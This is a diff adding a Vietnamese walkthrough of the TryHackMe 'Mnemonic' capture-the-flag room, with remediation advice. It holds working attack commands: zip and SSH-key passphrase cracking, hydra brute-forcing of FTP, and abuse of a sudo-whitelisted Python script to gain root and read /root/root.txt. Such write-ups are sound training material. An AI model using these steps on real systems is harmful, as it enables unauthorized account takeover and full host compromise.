@@ -1,0 +1,143 @@
+---
+title: 'Mnemonic'
+description: 'Một file zip backup có mật khẩu dẫn qua creds FTP crack được tới một SSH key, mà passphrase giải mã một cipher tự chế dựa trên ảnh để lấy mật khẩu user, kết thúc ở một script Python chạy qua sudo có đường nhập liệu ẩn sinh root shell.'
+date: 2026-02-25
+platform: tryhackme
+room: 'Mnemonic'
+roomUrl: 'https://tryhackme.com/room/mnemonic'
+difficulty: medium
+tags:
+  - 'web'
+  - 'ftp'
+  - 'password-cracking'
+  - 'crypto'
+  - 'linux'
+  - 'privesc'
+vulnClasses:
+  - 'weak credentials'
+  - 'insecure command execution'
+  - 'insecure sudo configuration'
+translation: done
+draft: false
+---
+
+_Hướng dẫn giải phòng "Mnemonic" trên TryHackMe. Đây là một chuỗi manh mối: một zip backup crack được làm lộ username FTP, FTP trao một SSH key, passphrase của key đưa ta vào với tư cách_ _`james`\*\*, một cipher tự chế dựa trên ảnh giải mã mật khẩu của user kế tiếp, và một script Python được phép chạy qua_ _`sudo`_ _với đường nhập liệu ẩn trao quyền root._
+
+> Mnemonic là một challenge huấn luyện hợp pháp trên TryHackMe; mọi thao tác ở đây đều thực hiện trên mục tiêu luyện tập được cấp phép. Flag và mọi mật khẩu khôi phục được hiển thị dưới dạng `THM{<redacted>}` / `<redacted>` — có thật trên máy, giấu đi ở đây.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+`robots.txt` trỏ tới `/webmasters`, nơi giấu `/backups/backups.zip` → crack zip (`fcrackzip`) để đọc một note nêu tên FTP user `ftpuser` → brute FTP (`hydra`) → thư mục FTP `data-4` chứa `id_rsa` của `james` → crack passphrase của key (`ssh2john` + `john`) và SSH vào với tư cách **james** → home của james có một URL ảnh và một file số cho một **cipher “Mnemonic” dựa trên ảnh tự chế**; chạy công cụ này giải mã mật khẩu của **condor** → SSH thành condor → `sudo -l` cho phép `python3 /bin/examplecode.py`, mà prompt thoát của nó bí mật chạy input dưới quyền root → **root** (root flag).
+
+</Callout>
+
+### **Mục tiêu**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-ip>
+```
+
+`nmap`/`rustscan` cho thấy FTP, một web server (robots disallow `/webmasters/*`), và SSH trên cổng không chuẩn:
+
+```text
+21/tcp   open  ftp   vsftpd 3.0.3
+80/tcp   open  http  Apache 2.4.29   # robots.txt disallows /webmasters/*
+1337/tcp open  ssh   OpenSSH 7.6p1 Ubuntu
+```
+
+### **Lỗ hổng**
+
+Mnemonic không có một lỗi hoành tráng duy nhất — nó là một chuỗi bí mật yếu: một zip crack được, một mật khẩu FTP nằm trong rockyou, một SSH key có passphrase yếu, và một cipher tự chế bảo vệ credential kế tiếp. Privesc là một mô-típ kinh điển: một script được whitelist qua `sudo` có đường code thực thi input người dùng dưới quyền root.
+
+<Callout type="insight">
+
+Điểm nổi bật là **cipher dựa trên ảnh tự chế**. Home của `james` để lại hai manh mối — một URL thumbnail YouTube (base64-encode thành tên thư mục) và một file số nguyên lớn (`6450.txt`). Công cụ “Mnemonic” (tên tác giả ghi trong một note) dùng _ảnh_ làm khóa để giải file số về plaintext: mật khẩu của condor. Tự chế crypto nghĩa là bất cứ ai tìm được khóa (ở đây là một ảnh công khai) đều đảo ngược được nó.
+
+</Callout>
+
+### **Bước 1 — crack zip backup → FTP user**
+
+`/webmasters` enumerate ra `/backups/backups.zip`. Crack nó và đọc note:
+
+```text
+fcrackzip -D -p rockyou.txt -u backups.zip   # PASSWORD FOUND: <redacted>
+unzip backups.zip && cat backups/note.txt
+# James new ftp username: ftpuser
+```
+
+### **Bước 2 — brute FTP → lấy trộm SSH key của james**
+
+```text
+hydra -l ftpuser -P rockyou.txt ftp://$IP      # ftpuser : <redacted>
+ftp -A $IP   # browse data-1 .. data-10; data-4 has id_rsa + not.txt
+```
+
+`data-4/id_rsa` là private key của `james` (và `not.txt` gợi ý mật khẩu FTP đổi — key mới là đường vào).
+
+### **Bước 3 — crack passphrase của key → SSH thành james**
+
+```text
+ssh2john id_rsa > hash_rsa.txt
+john --wordlist=rockyou.txt hash_rsa.txt   # passphrase: <redacted>
+ssh -i id_rsa james@$IP -p 1337
+```
+
+Home của `james` để lại manh mối cipher: một note ghi công cụ “Mnemonic”, một file số (`6450.txt`), và — dưới home của `condor` — các tên thư mục base64 giải ra một flag và một URL ảnh công khai (khóa).
+
+### **Bước 4 — giải cipher ảnh → mật khẩu condor**
+
+Clone công cụ Mnemonic, đưa cho nó ảnh đã tải làm khóa và `6450.txt` làm ciphertext, rồi chọn decrypt:
+
+```text
+# python3 Mnemonic.py  -> image key + 6450.txt -> decrypts condor's password: <redacted>
+ssh condor@$IP -p 1337
+```
+
+### **Bước 5 — đường ẩn của script sudo → root (root flag)**
+
+`condor` được chạy một script dưới quyền root:
+
+```text
+condor@mnemonic:~$ sudo -l
+# (ALL : ALL) /usr/bin/python3 /bin/examplecode.py
+```
+
+Đọc `/bin/examplecode.py`, prompt thoát của menu không chỉ thoát: nhập `.` khiến nó chạy bất cứ thứ gì bạn gõ **dưới quyền root**. Nên chọn tùy chọn thoát, trả lời `.`, và chạy lệnh dưới quyền root:
+
+```text
+sudo /usr/bin/python3 /bin/examplecode.py
+# Select: 0
+# are you sure you want to quit ? yes : .
+# (now root) -> cat /root/root.txt -> THM{<redacted>}
+```
+
+### **Tác động**
+
+<Callout type="critical">
+
+**Cao — CVSS 3.1 \~8.8** (`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`). Một chuỗi bí mật yếu (zip crack được, mật khẩu FTP trong rockyou, passphrase SSH-key yếu) cộng một cipher tự chế chỉ được bảo vệ bằng một ảnh công khai cho phép chiếm tài khoản tuần tự lên tới `condor`. Một script được whitelist qua `sudo` thực thi input người dùng dưới quyền root sau đó cho root đầy đủ — xâm phạm hoàn toàn host.
+
+</Callout>
+
+### **Khuyến nghị khắc phục**
+
+<Callout type="fix">
+
+- **Bí mật mạnh, duy nhất ở mọi nơi:** mật khẩu zip, mật khẩu FTP và passphrase SSH-key sống sót qua rockyou; đừng cất private key trên FTP.
+- **Không tự chế crypto.** Một cipher khoá bằng một ảnh dễ đoán/công khai chẳng bảo vệ gì; dùng thuật toán đã được kiểm chứng và quản lý khóa thực sự.
+- **Sửa script sudo.** Một helper chạy dưới root không bao giờ được `eval`/`exec`/`os.system` trên input người dùng, và sudo nên whitelist các hành động an toàn cụ thể, không phải một script tương tác.
+
+</Callout>
+
+### **Bài học rút ra**
+
+- **Box kiểu manh mối thưởng cho sự kiên nhẫn** — mỗi bí mật yếu mở ra vật liệu khóa cho bước kế tiếp.
+- **“Mã hoá tự chế” là cờ đỏ, không phải tính năng.** Nếu khóa là một ảnh công khai, giải mã chỉ là làm theo hướng dẫn.
+- **Audit các script trong** **`sudo -l`** **tìm đường nhập liệu ẩn.** Một menu bí mật chạy văn bản của bạn dưới quyền root là một privesc một dòng.
+
+Mnemonic là bài học gọn về việc một chuỗi điểm yếu nhỏ lẻ cộng lại thành root. Cảm ơn đã đọc.
